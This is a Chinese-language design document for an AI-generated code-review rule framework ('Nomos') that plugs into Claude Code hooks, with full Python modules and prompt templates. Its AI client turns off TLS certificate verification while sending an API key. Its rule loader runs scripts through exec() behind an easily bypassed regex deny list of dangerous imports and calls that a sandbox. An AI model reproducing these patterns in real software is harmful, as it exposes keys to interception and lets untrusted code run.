# Layer 3 Dynamic Rules Design (第三层动态规则系统设计)

**Document Version:** 1.0
**Last Updated:** 2026-02-28
**Status:** DESIGN

---

## 📋 文档概述

本文档详细设计 Layer 3 动态规则系统，实现从"预制规则配置化"到"动态生成规则脚本"的架构演进。

### 核心目标

- ✅ **完全定制化**：满足任何项目特定的业务规则需求
- ✅ **用户可控**：用户可直接 review 和修改生成的规则脚本
- ✅ **基础能力复用**：统一的 Foundation 层供所有规则使用
- ✅ **规则与任务绑定**：规则存储在 task 目录，互不干扰

### 架构演进对比

```
┌─────────────────────────────────────────────────────────────┐
│                    当前架构（预制规则）                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  plan.md (配置) → DynamicRuleLoader → 预制规则类 → 执行    │
│                                                             │
│  ❌ 问题: 规则硬编码，无法满足定制需求                      │
│  ❌ 问题: 用户只能改配置，不能改逻辑                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    新架构（动态规则）                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  plan.md (需求) → AI 生成脚本 → 动态加载 → 执行            │
│                                                             │
│  ✅ 优点: 完全定制化，满足任何业务需求                      │
│  ✅ 优点: 用户可 review/修改生成的规则                      │
│  ✅ 优点: 规则与 task 绑定，互不干扰                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 1. l3_foundation 基础能力层设计

### 1.1 架构概览

```
┌─────────────────────────────────────────────────────────────┐
│              l3_foundation 基础能力层                        │
│              .claude/hooks/lib/l3_foundation/               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ __init__.py          # 统一导出接口                   │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ base_rule.py         # 规则基类 + 数据结构            │ │
│  │  • BaseRule          # 规则基类                       │ │
│  │  • RuleViolation     # 违规记录                       │ │
│  │  • Severity          # 严重程度枚举                   │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ ai_client.py         # AI 调用能力                    │ │
│  │  • AIClient          # 单例 AI 客户端                 │ │
│  │  • call()            # 调用 AI 进行语义判断           │ │
│  │  • 缓存机制          # 避免重复调用                   │ │
│  │  • 重试机制          # 30s 超时 + 3 次重试            │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ ast_utils.py         # AST 解析能力                   │ │
│  │  • ASTUtils.parse()           # 解析代码为 AST        │ │
│  │  • ASTUtils.find_functions()  # 查找所有函数          │ │
│  │  • ASTUtils.find_classes()    # 查找所有类            │ │
│  │  • ASTUtils.get_function_source()  # 提取函数源码     │ │
│  │  • ASTUtils.extract_imports()      # 提取 import 语句 │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ prompt_builder.py    # Prompt 构建工具                │ │
│  │  • PromptBuilder.build()      # 构建 prompt           │ │
│  │  • add_examples()             # 添加 few-shot 示例    │ │
│  │  • add_context()              # 添加项目上下文         │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ rule_context.py      # 规则上下文                     │ │
│  │  • RuleContext.task_dir       # 当前 task 目录        │ │
│  │  • RuleContext.project_root   # 项目根目录            │ │
│  │  • RuleContext.plan_content   # plan.md 内容          │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │ rule_loader.py       # 动态规则加载器                 │ │
│  │  • DynamicRuleLoader.load_from_task()  # 加载规则     │ │
│  │  • 沙箱执行          # 安全隔离                       │ │
│  │  • 依赖注入          # 注入基础能力                   │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 核心 API 设计

#### 1.2.1 base_rule.py

```python
"""
基础规则模块 - 定义规则基类和数据结构
"""

from enum import Enum
from typing import List, Dict, Any, Optional
from dataclasses import dataclass


class Severity(Enum):
    """违规严重程度"""
    ERROR = "error"      # 阻断性错误
    WARNING = "warning"  # 警告
    INFO = "info"        # 信息提示


@dataclass
class RuleViolation:
    """规则违规记录"""
    rule: str              # 规则名称
    message: str           # 违规描述
    line: int              # 行号
    column: int            # 列号
    severity: Severity     # 严重程度
    suggestion: str = ""   # 修复建议

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典格式"""
        return {
            "rule": self.rule,
            "message": self.message,
            "line": self.line,
            "column": self.column,
            "severity": self.severity.value,
            "suggestion": self.suggestion
        }


class BaseRule:
    """规则基类 - 所有规则必须继承此类"""

    # 规则元信息 (子类必须定义)
    name: str = ""              # 规则名称
    layer: int = 3              # 规则层级
    description: str = ""       # 规则描述
    handler_type: str = "command"  # handler 类型: command / prompt

    def __init__(self, config: Dict[str, Any] = None):
        """
        初始化规则

        Args:
            config: 规则配置 (从 plan.md 读取)
        """
        self.config = config or {}

    def check(self, file_path: str, content: str) -> List[RuleViolation]:
        """
        检查代码是否违规

        Args:
            file_path: 文件路径
            content: 文件内容

        Returns:
            违规记录列表
        """
        raise NotImplementedError("子类必须实现 check() 方法")

    def should_check(self, file_path: str) -> bool:
        """
        判断是否需要检查此文件

        Args:
            file_path: 文件路径

        Returns:
            True 表示需要检查
        """
        # 默认检查所有文件，子类可覆盖
        return True
```

#### 1.2.2 ai_client.py

```python
"""
AI 客户端模块 - 提供 AI 调用能力
"""

import os
import json
import hashlib
import time
import ssl
import urllib.request
import urllib.error
from typing import Optional, Dict


class AIClient:
    """
    轻量级 AI 客户端 - 零配置设计

    环境变量 (优先级递减):
      API Key: ANTHROPIC_API_KEY > ANTHROPIC_AUTH_TOKEN > NOMOS_API_KEY
      Base URL: ANTHROPIC_BASE_URL > NOMOS_API_BASE_URL
      Model: ANTHROPIC_DEFAULT_HAIKU_MODEL > DEFAULT_HAIKU_MODEL
      Timeout: NOMOS_AI_TIMEOUT (默认 30 秒)
    """

    _instance = None
    _initialized = False

    # 默认配置
    DEFAULT_MODEL = "claude-3-5-haiku-20241022"
    DEFAULT_BASE_URL = "https://api.anthropic.com"
    DEFAULT_TIMEOUT = 30
    MAX_RETRIES = 3

    def __new__(cls):
        """单例模式"""
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self):
        """初始化 AI 客户端"""
        if self._initialized:
            return

        # 读取 API Key
        self.api_key = (
            os.environ.get("ANTHROPIC_API_KEY") or
            os.environ.get("ANTHROPIC_AUTH_TOKEN") or
            os.environ.get("NOMOS_API_KEY") or
            os.environ.get("CLAUDE_API_KEY")
        )

        # 读取 Base URL
        self.base_url = (
            os.environ.get("ANTHROPIC_BASE_URL") or
            os.environ.get("NOMOS_API_BASE_URL") or
            self.DEFAULT_BASE_URL
        )

        # 读取 Model
        self.model = (
            os.environ.get("ANTHROPIC_DEFAULT_HAIKU_MODEL") or
            os.environ.get("DEFAULT_HAIKU_MODEL") or
            os.environ.get("NOMOS_HAIKU_MODEL") or
            self.DEFAULT_MODEL
        )

        # 读取超时
        try:
            self.timeout = int(os.environ.get("NOMOS_AI_TIMEOUT", str(self.DEFAULT_TIMEOUT)))
        except ValueError:
            self.timeout = self.DEFAULT_TIMEOUT

        # 可用性标志
        self._available = self.api_key is not None

        # 简单内存缓存 (hash -> result)
        self._cache: Dict[str, Dict] = {}
        self._cache_max_size = 100

        self._initialized = True

    @property
    def available(self) -> bool:
        """AI 服务是否可用"""
        return self._available

    def call(self, prompt: str, content: str, max_tokens: int = 512) -> Optional[Dict]:
        """
        调用 AI 进行判断 (带重试机制)

        Args:
            prompt: 系统提示词
            content: 待分析的代码内容
            max_tokens: 最大 token 数

        Returns:
            解析后的 JSON 结果, 或 None (调用失败时)
        """
        if not self._available:
            return None

        # 检查缓存
        cache_key = hashlib.md5(f"{prompt}:{content}".encode()).hexdigest()
        if cache_key in self._cache:
            return self._cache[cache_key]

        # 构建请求
        full_prompt = f"{prompt}\n\n---\n代码:\n```\n{content}\n```"

        request_body = {
            "model": self.model,
            "max_tokens": max_tokens,
            "messages": [{"role": "user", "content": full_prompt}]
        }

        url = f"{self.base_url.rstrip('/')}/v1/messages"

        # 重试机制
        last_error = None
        for attempt in range(self.MAX_RETRIES):
            try:
                result = self._make_request(url, request_body)

                # 尝试解析 JSON
                try:
                    parsed = json.loads(result)
                except json.JSONDecodeError:
                    # 尝试提取 markdown 代码块中的 JSON
                    import re
                    json_match = re.search(r'```(?:json)?\s*([\s\S]*?)\s*```', result)
                    if json_match:
                        try:
                            parsed = json.loads(json_match.group(1))
                        except json.JSONDecodeError:
                            parsed = {"raw_response": result, "violations": []}
                    else:
                        # AI 返回非 JSON, 包装成标准格式
                        parsed = {"raw_response": result, "violations": []}

                # 写入缓存
                self._cache[cache_key] = parsed
                if len(self._cache) > self._cache_max_size:
                    # 简单 LRU: 清空一半
                    keys = list(self._cache.keys())
                    for k in keys[:len(keys)//2]:
                        del self._cache[k]

                return parsed

            except (urllib.error.URLError, urllib.error.HTTPError,
                    KeyError, TimeoutError, Exception) as e:
                last_error = e
                # 重试前等待 (指数退避)
                if attempt < self.MAX_RETRIES - 1:
                    time.sleep(1 * (attempt + 1))
                continue

        # 所有重试失败
        return None

    def _make_request(self, url: str, body: Dict) -> str:
        """发起 HTTP 请求"""
        req = urllib.request.Request(
            url,
            data=json.dumps(body).encode('utf-8'),
            headers={
                "x-api-key": self.api_key,
                "anthropic-version": "2023-06-01",
                "content-type": "application/json"
            },
            method="POST"
        )

        # 创建 SSL 上下文 (处理证书验证问题)
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        with urllib.request.urlopen(req, timeout=self.timeout, context=ssl_context) as response:
            result = json.loads(response.read().decode('utf-8'))
            return result["content"][0]["text"]
```


#### 1.2.3 ast_utils.py

```python
"""
AST 工具模块 - 提供代码解析能力
"""

import ast
from typing import List, Optional, Dict, Any


class ASTUtils:
    """AST 解析工具类"""

    @staticmethod
    def parse(content: str) -> Optional[ast.AST]:
        """
        解析代码为 AST

        Args:
            content: 代码内容

        Returns:
            AST 对象，解析失败返回 None
        """
        try:
            return ast.parse(content)
        except SyntaxError:
            return None

    @staticmethod
    def find_functions(tree: ast.AST) -> List[ast.FunctionDef]:
        """
        查找所有函数定义

        Args:
            tree: AST 对象

        Returns:
            函数定义节点列表
        """
        functions = []
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                functions.append(node)
        return functions

    @staticmethod
    def find_classes(tree: ast.AST) -> List[ast.ClassDef]:
        """
        查找所有类定义

        Args:
            tree: AST 对象

        Returns:
            类定义节点列表
        """
        classes = []
        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef):
                classes.append(node)
        return classes

    @staticmethod
    def get_function_source(func: ast.FunctionDef, content: str) -> str:
        """
        提取函数源码

        Args:
            func: 函数定义节点
            content: 完整代码内容

        Returns:
            函数源码
        """
        lines = content.split('\n')
        # 获取函数起始行到结束行
        start_line = func.lineno - 1
        end_line = func.end_lineno if hasattr(func, 'end_lineno') else start_line + 1
        return '\n'.join(lines[start_line:end_line])

    @staticmethod
    def extract_imports(tree: ast.AST) -> List[Dict[str, Any]]:
        """
        提取所有 import 语句

        Args:
            tree: AST 对象

        Returns:
            import 信息列表
            [
                {"type": "import", "module": "os", "line": 1},
                {"type": "from", "module": "typing", "names": ["List"], "line": 2}
            ]
        """
        imports = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.append({
                        "type": "import",
                        "module": alias.name,
                        "line": node.lineno
                    })
            elif isinstance(node, ast.ImportFrom):
                imports.append({
                    "type": "from",
                    "module": node.module,
                    "names": [alias.name for alias in node.names],
                    "line": node.lineno
                })
        return imports

    @staticmethod
    def get_function_signature(func: ast.FunctionDef) -> str:
        """
        获取函数签名

        Args:
            func: 函数定义节点

        Returns:
            函数签名字符串
        """
        params = [arg.arg for arg in func.args.args]
        return_type = ast.unparse(func.returns) if func.returns else "None"
        return f"{func.name}({', '.join(params)}) -> {return_type}"

    @staticmethod
    def get_class_methods(cls: ast.ClassDef) -> List[str]:
        """
        获取类的所有方法名

        Args:
            cls: 类定义节点

        Returns:
            方法名列表
        """
        return [node.name for node in cls.body if isinstance(node, ast.FunctionDef)]
```

#### 1.2.4 prompt_builder.py

```python
"""
Prompt 构建模块 - 提供 Prompt 构建能力
"""

from typing import List, Dict, Any, Optional


class PromptBuilder:
    """Prompt 构建器"""

    def __init__(self, base_prompt: str = ""):
        """
        初始化 Prompt 构建器

        Args:
            base_prompt: 基础 prompt
        """
        self.base_prompt = base_prompt
        self.examples: List[Dict[str, str]] = []
        self.context: Dict[str, Any] = {}

    def add_example(self, code: str, expected: str, reason: str = "") -> 'PromptBuilder':
        """
        添加 few-shot 示例

        Args:
            code: 示例代码
            expected: 期望结果 (✅ 正确 / ❌ 错误)
            reason: 原因说明

        Returns:
            self (支持链式调用)
        """
        self.examples.append({
            "code": code,
            "expected": expected,
            "reason": reason
        })
        return self

    def add_context(self, key: str, value: Any) -> 'PromptBuilder':
        """
        添加项目上下文

        Args:
            key: 上下文键
            value: 上下文值

        Returns:
            self (支持链式调用)
        """
        self.context[key] = value
        return self

    def build(self) -> str:
        """
        构建最终 prompt

        Returns:
            完整的 prompt 字符串
        """
        parts = [self.base_prompt]

        # 添加上下文
        if self.context:
            parts.append("\n## 项目上下文\n")
            for key, value in self.context.items():
                parts.append(f"- {key}: {value}")

        # 添加示例
        if self.examples:
            parts.append("\n## 示例\n")
            for i, example in enumerate(self.examples, 1):
                parts.append(f"\n### 示例 {i}\n")
                parts.append(f"```\n{example['code']}\n```")
                parts.append(f"{example['expected']}")
                if example['reason']:
                    parts.append(f"原因: {example['reason']}")

        return "\n".join(parts)
```

#### 1.2.5 rule_context.py

```python
"""
规则上下文模块 - 提供规则执行上下文
"""

import os
from pathlib import Path
from typing import Optional


class RuleContext:
    """规则上下文 - 提供当前任务和项目信息"""

    _instance = None
    _initialized = False

    def __new__(cls):
        """单例模式"""
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self):
        """初始化规则上下文"""
        if self._initialized:
            return

        self._task_dir: Optional[str] = None
        self._project_root: Optional[Path] = None
        self._plan_content: Optional[str] = None

        self._initialized = True

    @property
    def task_dir(self) -> Optional[str]:
        """获取当前 task 目录"""
        if self._task_dir:
            return self._task_dir

        project_root = self.project_root
        if not project_root:
            return None

        current_task_file = project_root / ".claude" / "current-task.txt"
        if current_task_file.exists():
            try:
                task_path = current_task_file.read_text().strip()
                if not task_path.startswith('/'):
                    task_path = str(project_root / task_path)
                if os.path.isdir(task_path):
                    self._task_dir = task_path
                    return self._task_dir
            except IOError:
                pass

        return None

    @property
    def project_root(self) -> Optional[Path]:
        """获取项目根目录"""
        if self._project_root:
            return self._project_root

        cwd = os.getcwd()
        path = Path(cwd)
        for _ in range(5):
            if (path / ".git").exists() or (path / ".claude").exists():
                self._project_root = path
                return self._project_root
            path = path.parent

        return Path(cwd)

    @property
    def plan_content(self) -> Optional[str]:
        """获取 plan.md 内容"""
        if self._plan_content:
            return self._plan_content

        task_dir = self.task_dir
        if not task_dir:
            return None

        plan_file = Path(task_dir) / "plan.md"
        if plan_file.exists():
            try:
                self._plan_content = plan_file.read_text(encoding='utf-8')
                return self._plan_content
            except IOError:
                pass

        return None

    def reset(self):
        """重置上下文 (用于测试)"""
        self._task_dir = None
        self._project_root = None
        self._plan_content = None
```

#### 1.2.6 rule_loader.py

```python
"""
动态规则加载模块 - 从 task 目录加载规则脚本
"""

import os
import re
from pathlib import Path
from typing import List, Dict, Any

from .base_rule import BaseRule, RuleViolation, Severity
from .ai_client import AIClient
from .ast_utils import ASTUtils
from .prompt_builder import PromptBuilder
from .rule_context import RuleContext


class DynamicRuleLoader:
    """动态规则加载器 - 从 task 目录加载规则脚本"""

    def load_from_task(self, task_dir: str) -> List[BaseRule]:
        """
        从 task 目录加载所有规则

        扫描: {task_dir}/rules/*.py

        Args:
            task_dir: task 目录路径

        Returns:
            规则实例列表
        """
        rules_dir = Path(task_dir) / "rules"
        if not rules_dir.exists():
            return []

        rules = []
        for script_path in rules_dir.glob("*.py"):
            try:
                loaded_rules = self._load_script(script_path)
                if loaded_rules:
                    rules.extend(loaded_rules)
            except Exception as e:
                # 加载失败，记录警告
                print(f"⚠️  Warning: Failed to load rule {script_path}: {e}")

        return rules

    def _load_script(self, script_path: Path) -> List[BaseRule]:
        """
        加载单个脚本 (带安全沙箱)

        Args:
            script_path: 脚本路径

        Returns:
            规则实例列表
        """
        # 1. 读取脚本内容
        source = script_path.read_text(encoding='utf-8')

        # 2. 安全校验 (禁止危险操作)
        if self._has_dangerous_code(source):
            raise ValueError(f"Rule script contains dangerous code: {script_path}")

        # 3. 沙箱执行环境
        sandbox_globals = {
            # 注入基础能力
            "BaseRule": BaseRule,
            "RuleViolation": RuleViolation,
            "Severity": Severity,
            "AIClient": AIClient,
            "ASTUtils": ASTUtils,
            "PromptBuilder": PromptBuilder,
            "RuleContext": RuleContext,
        }

        # 4. 执行脚本
        exec(compile(source, str(script_path), "exec"), sandbox_globals)

        # 5. 提取所有 BaseRule 子类
        rules = []
        for name, obj in sandbox_globals.items():
            if (isinstance(obj, type) and
                issubclass(obj, BaseRule) and
                obj is not BaseRule):
                rules.append(obj())

        return rules

    def _has_dangerous_code(self, source: str) -> bool:
        """
        安全检查: 禁止危险操作

        Args:
            source: 脚本源码

        Returns:
            True 表示包含危险代码
        """
        dangerous_patterns = [
            r"import\s+os\b",
            r"import\s+subprocess",
            r"import\s+sys\b",
            r"__import__",
            r"\beval\s*\(",
            r"\bexec\s*\(",
            r"\bopen\s*\(",
            r"from\s+os\s+import",
            r"from\s+subprocess\s+import",
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, source):
                return True
        return False
```

#### 1.2.7 __init__.py

```python
"""
l3_foundation - Layer 3 基础能力层

导出清单:
  - BaseRule: 规则基类
  - RuleViolation: 违规记录
  - Severity: 严重程度
  - AIClient: AI 调用客户端
  - ASTUtils: AST 解析工具
  - PromptBuilder: Prompt 构建器
  - RuleContext: 规则上下文
  - DynamicRuleLoader: 动态规则加载器
"""

from .base_rule import BaseRule, RuleViolation, Severity
from .ai_client import AIClient
from .ast_utils import ASTUtils
from .prompt_builder import PromptBuilder
from .rule_context import RuleContext
from .rule_loader import DynamicRuleLoader

__all__ = [
    "BaseRule",
    "RuleViolation",
    "Severity",
    "AIClient",
    "ASTUtils",
    "PromptBuilder",
    "RuleContext",
    "DynamicRuleLoader",
]

__version__ = "1.0.0"
```

---

## 2. 规则脚本模板和生成 Prompt 设计

### 2.1 规则脚本模板

#### 2.1.1 Command Handler 模板

```python
# Auto-generated by Nomos
# Task: {task_id}
# Rule: {rule_name}
# Generated: {timestamp}
# Source: plan.md 业务规则 #{rule_index}

"""
规则: {rule_description}

需求来源: plan.md
描述: {detailed_description}
"""

from l3_foundation import (
    BaseRule, RuleViolation, Severity,
    ASTUtils, RuleContext
)


class {RuleClassName}(BaseRule):
    """
    {rule_description}
    """

    name = "{rule_name}"
    layer = 3
    handler_type = "command"
    description = "{rule_description}"

    def check(self, file_path: str, content: str) -> list[RuleViolation]:
        """
        检查代码是否违规

        Args:
            file_path: 文件路径
            content: 文件内容

        Returns:
            违规记录列表
        """
        violations = []

        # 使用 AST 解析
        tree = ASTUtils.parse(content)
        if not tree:
            return violations

        # {检查逻辑描述}
        {check_logic}

        return violations

    def should_check(self, file_path: str) -> bool:
        """判断是否需要检查此文件"""
        # {文件过滤逻辑}
        {file_filter_logic}
```

#### 2.1.2 Prompt Handler 模板

```python
# Auto-generated by Nomos
# Task: {task_id}
# Rule: {rule_name}
# Generated: {timestamp}
# Source: plan.md 业务规则 #{rule_index}

"""
规则: {rule_description}

需求来源: plan.md
描述: {detailed_description}
"""

from l3_foundation import (
    BaseRule, RuleViolation, Severity,
    AIClient, PromptBuilder, RuleContext
)


class {RuleClassName}(BaseRule):
    """
    {rule_description}
    """

    name = "{rule_name}"
    layer = 3
    handler_type = "prompt"
    description = "{rule_description}"

    def __init__(self, config=None):
        super().__init__(config)
        self.ai_client = AIClient()

    def check(self, file_path: str, content: str) -> list[RuleViolation]:
        """
        检查代码是否违规 (使用 AI 语义判断)

        Args:
            file_path: 文件路径
            content: 文件内容

        Returns:
            违规记录列表
        """
        violations = []

        # 快速预检
        if not self._should_ai_check(content):
            return violations

        # 构建 prompt
        prompt = self._build_prompt()

        # 调用 AI
        if self.ai_client.available:
            result = self.ai_client.call(prompt, content)
            if result:
                violations = self._parse_ai_result(result, file_path)

        return violations

    def _should_ai_check(self, content: str) -> bool:
        """快速预检 - 确定性场景跳过 AI"""
        # {预检逻辑}
        {precheck_logic}

    def _build_prompt(self) -> str:
        """构建 AI prompt"""
        builder = PromptBuilder("""
你是代码审查专家。检查代码是否符合以下规则:

{rule_description}

规则详情:
{detailed_rules}

返回 JSON 格式:
{
  "violations": [
    {"line": 行号, "reason": "违规原因"}
  ]
}

如果没有违规, 返回: {"violations": []}
""")

        # 添加 few-shot 示例
        {add_examples}

        return builder.build()

    def _parse_ai_result(self, result: dict, file_path: str) -> list[RuleViolation]:
        """解析 AI 返回结果"""
        violations = []
        for item in result.get('violations', []):
            violations.append(RuleViolation(
                rule=self.name,
                message=item.get('reason', '违规'),
                line=item.get('line', 0),
                column=0,
                severity=Severity.{severity},
                suggestion="{suggestion}"
            ))
        return violations

    def should_check(self, file_path: str) -> bool:
        """判断是否需要检查此文件"""
        # {文件过滤逻辑}
        {file_filter_logic}
```

### 2.2 规则生成 Prompt 设计

#### 2.2.1 生成 Command Handler 的 Prompt

```
你是 Python 代码生成专家。根据用户的业务规则需求，生成 Layer 3 规则脚本。

## 任务信息

- Task ID: {task_id}
- Task 目录: {task_dir}
- 项目根目录: {project_root}

## 业务规则需求

{rule_description_from_plan}

## 生成要求

1. **Handler 类型**: Command Handler (使用 AST 静态分析)
2. **脚本模板**: 使用提供的 Command Handler 模板
3. **基础能力**: 必须使用 l3_foundation 提供的能力
   - BaseRule: 规则基类
   - RuleViolation: 违规记录
   - Severity: 严重程度
   - ASTUtils: AST 解析工具
   - RuleContext: 规则上下文

4. **检查逻辑**: 
   - 使用 ASTUtils.parse() 解析代码
   - 使用 ASTUtils.find_functions() / find_classes() 查找目标
   - 实现具体的检查逻辑
   - 返回 RuleViolation 列表

5. **文件过滤**:
   - 实现 should_check() 方法
   - 只检查相关文件类型

6. **代码质量**:
   - 添加详细的文档字符串
   - 添加必要的注释
   - 处理边界情况

## 输出格式

直接输出完整的 Python 脚本，不要包含任何解释文字。

## 示例

输入需求: "所有 API 返回必须带 trace_id"

输出脚本:
```python
# Auto-generated by Nomos
# Task: t1-api-trace-id
# Rule: trace_id_check
# Generated: 2026-02-28 10:30
# Source: plan.md 业务规则 #1

"""
规则: API 返回必须带 trace_id

需求来源: plan.md
描述: 所有 API 响应必须包含 trace_id 字段，便于追踪
"""

from l3_foundation import (
    BaseRule, RuleViolation, Severity,
    ASTUtils, RuleContext
)


class TraceIdCheckRule(BaseRule):
    """检查 API 返回是否包含 trace_id"""

    name = "trace_id_check"
    layer = 3
    handler_type = "command"
    description = "检查 API 返回是否包含 trace_id"

    def check(self, file_path: str, content: str) -> list[RuleViolation]:
        violations = []

        # 使用 AST 解析
        tree = ASTUtils.parse(content)
        if not tree:
            return violations

        # 查找所有函数
        for func in ASTUtils.find_functions(tree):
            if self._is_api_handler(func):
                # 检查返回值是否包含 trace_id
                func_source = ASTUtils.get_function_source(func, content)
                if not self._returns_trace_id(func_source):
                    violations.append(RuleViolation(
                        rule=self.name,
                        message=f"API handler '{func.name}' 返回值缺少 trace_id",
                        line=func.lineno,
                        column=0,
                        severity=Severity.ERROR,
                        suggestion="在返回的 dict 中添加 'trace_id' 字段"
                    ))

        return violations

    def _is_api_handler(self, func) -> bool:
        """判断是否是 API handler"""
        return func.name.startswith(("get_", "post_", "put_", "delete_"))

    def _returns_trace_id(self, func_source: str) -> bool:
        """检查函数是否返回 trace_id"""
        return "trace_id" in func_source or "traceId" in func_source

    def should_check(self, file_path: str) -> bool:
        """只检查 API 相关文件"""
        return "api" in file_path.lower() and file_path.endswith(".py")
```

现在，根据以下业务规则需求生成脚本:

{actual_rule_description}
```


#### 2.2.2 生成 Prompt Handler 的 Prompt

```
你是 Python 代码生成专家。根据用户的业务规则需求，生成 Layer 3 规则脚本。

## 任务信息

- Task ID: {task_id}
- Task 目录: {task_dir}
- 项目根目录: {project_root}

## 业务规则需求

{rule_description_from_plan}

## 生成要求

1. **Handler 类型**: Prompt Handler (使用 AI 语义分析)
2. **脚本模板**: 使用提供的 Prompt Handler 模板
3. **基础能力**: 必须使用 l3_foundation 提供的能力
   - BaseRule: 规则基类
   - RuleViolation: 违规记录
   - Severity: 严重程度
   - AIClient: AI 调用客户端
   - PromptBuilder: Prompt 构建器
   - RuleContext: 规则上下文

4. **检查逻辑**:
   - 实现 _should_ai_check() 快速预检
   - 实现 _build_prompt() 构建 AI prompt
   - 添加 few-shot 示例到 prompt
   - 实现 _parse_ai_result() 解析 AI 返回

5. **Prompt 设计**:
   - 清晰描述规则要求
   - 提供正反示例
   - 明确输出格式 (JSON)
   - 处理边界情况

6. **代码质量**:
   - 添加详细的文档字符串
   - 添加必要的注释
   - 处理 AI 调用失败情况

## 输出格式

直接输出完整的 Python 脚本，不要包含任何解释文字。

## 示例

输入需求: "检查敏感数据是否出现在日志中"

输出脚本:
```python
# Auto-generated by Nomos
# Task: t2-sensitive-data-check
# Rule: sensitive_data_in_log
# Generated: 2026-02-28 11:00
# Source: plan.md 业务规则 #2

"""
规则: 敏感数据禁止出现在日志中

需求来源: plan.md
描述: 密码、密钥、token 等敏感数据不能通过 logger 输出
"""

from l3_foundation import (
    BaseRule, RuleViolation, Severity,
    AIClient, PromptBuilder, RuleContext
)


class SensitiveDataInLogRule(BaseRule):
    """检查日志中是否包含敏感数据"""

    name = "sensitive_data_in_log"
    layer = 3
    handler_type = "prompt"
    description = "检查日志中是否包含敏感数据"

    def __init__(self, config=None):
        super().__init__(config)
        self.ai_client = AIClient()

    def check(self, file_path: str, content: str) -> list[RuleViolation]:
        violations = []

        # 快速预检
        if not self._should_ai_check(content):
            return violations

        # 构建 prompt
        prompt = self._build_prompt()

        # 调用 AI
        if self.ai_client.available:
            result = self.ai_client.call(prompt, content)
            if result:
                violations = self._parse_ai_result(result, file_path)

        return violations

    def _should_ai_check(self, content: str) -> bool:
        """快速预检 - 没有 logger 调用则跳过"""
        import re
        return bool(re.search(r'logger\.(info|debug|warning|error)', content))

    def _build_prompt(self) -> str:
        """构建 AI prompt"""
        builder = PromptBuilder("""
你是代码安全审查专家。检查代码中的日志输出是否包含敏感数据。

规则:
1. 密码、密钥、token 等敏感数据不能通过 logger 输出
2. 用户的个人隐私信息 (手机号、身份证号) 不能直接输出
3. 调试信息中的敏感数据需要脱敏处理

返回 JSON 格式:
{
  "violations": [
    {"line": 行号, "reason": "违规原因"}
  ]
}

如果没有违规, 返回: {"violations": []}
""")

        # 添加 few-shot 示例
        builder.add_example(
            code='logger.info(f"User password: {password}")',
            expected="❌ 错误",
            reason="密码不能输出到日志"
        )
        builder.add_example(
            code='logger.info(f"User login: {username}")',
            expected="✅ 正确",
            reason="用户名不是敏感数据"
        )
        builder.add_example(
            code='logger.debug(f"API key: {api_key[:8]}***")',
            expected="✅ 正确",
            reason="API key 已脱敏"
        )

        return builder.build()

    def _parse_ai_result(self, result: dict, file_path: str) -> list[RuleViolation]:
        """解析 AI 返回结果"""
        violations = []
        for item in result.get('violations', []):
            violations.append(RuleViolation(
                rule=self.name,
                message=item.get('reason', '日志中包含敏感数据'),
                line=item.get('line', 0),
                column=0,
                severity=Severity.ERROR,
                suggestion="对敏感数据进行脱敏处理或移除日志输出"
            ))
        return violations

    def should_check(self, file_path: str) -> bool:
        """只检查 Python 文件"""
        return file_path.endswith(".py")
```

现在，根据以下业务规则需求生成脚本:

{actual_rule_description}
```

---

## 3. Nomos SKILL 的规则生成与同步流程

### 3.1 整体流程

```
┌─────────────────────────────────────────────────────────────┐
│                    Nomos SKILL 工作流                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  触发点 1: plan.md 编写完成                                  │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ 用户在 plan.md 中描述业务规则:                          ││
│  │                                                         ││
│  │ ## 业务规则                                             ││
│  │                                                         ││
│  │ 1. 所有 API 返回必须带 trace_id                         ││
│  │ 2. 错误处理必须使用自定义 ErrorHandler                  ││
│  │ 3. 敏感数据 (密码/密钥) 禁止出现在日志中               ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  Step 1: 解析业务规则                                       │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ Nomos SKILL 调用 AI:                                    ││
│  │ • 提取业务规则列表                                      ││
│  │ • 判断每个规则的 Handler 类型 (Command / Prompt)        ││
│  │ • 生成规则元信息 (name, description, severity)         ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
│                         ▼                                   │
│  Step 2: 生成规则脚本                                       │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ for rule in business_rules:                             ││
│  │     if rule.handler_type == "command":                  ││
│  │         script = generate_command_handler(rule)         ││
│  │     elif rule.handler_type == "prompt":                 ││
│  │         script = generate_prompt_handler(rule)          ││
│  │                                                         ││
│  │     save(f"{task_dir}/rules/{rule.name}.py", script)    ││
│  └─────────────────────────────────────────────────────────┘│
│                         │                                   │
